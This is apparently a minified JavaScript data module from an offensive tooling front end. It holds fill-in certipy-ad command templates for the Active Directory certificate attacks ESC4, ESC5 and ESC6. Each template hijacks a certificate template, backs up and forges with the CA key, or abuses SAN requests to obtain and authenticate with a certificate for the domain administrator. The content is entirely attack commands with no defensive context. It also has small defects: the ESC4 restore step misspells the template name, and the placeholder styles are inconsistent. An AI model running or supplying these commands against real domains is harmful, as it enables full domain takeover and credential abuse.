const a=[{title:"ESC 4",description:"Template Hijacking",template:`certipy-ad template -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerable-ESC4 -target {domain} -save-old

certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerable-ESC4 -target {domain} -upn administrator@{domain}

certipy-ad template -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerble-ESC4 -target {domain} -configuration Vulnerble-ESC4.json

certipy-ad auth -pfx administrator.pfx`},{title:"ESC 5",description:"Vulnerable PKI Object Access Control",template:`certipy-ad ca -backup -u {username}@{domain} -p {password} -ca {ca_name} -target {dc_ip}

certipy-ad forge -ca-pfx '{ca_pfx_file}' -upn administrator@{domain}

certipy-ad auth -pfx administrator_forged.pfx -dc-ip {dc_ip}`},{title:"ESC 6",description:"CA Allows SAN Specification via Request Attributes",template:`certipy-ad find -u <username> -p <password> -dc-ip {dc_ip} -vulnerable -enabled

certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template User -target {domain} -upn administrator@{domain}

certipy-ad auth -pfx administrator.pfx`}],e={commands:a};export{a as commands,e as default};
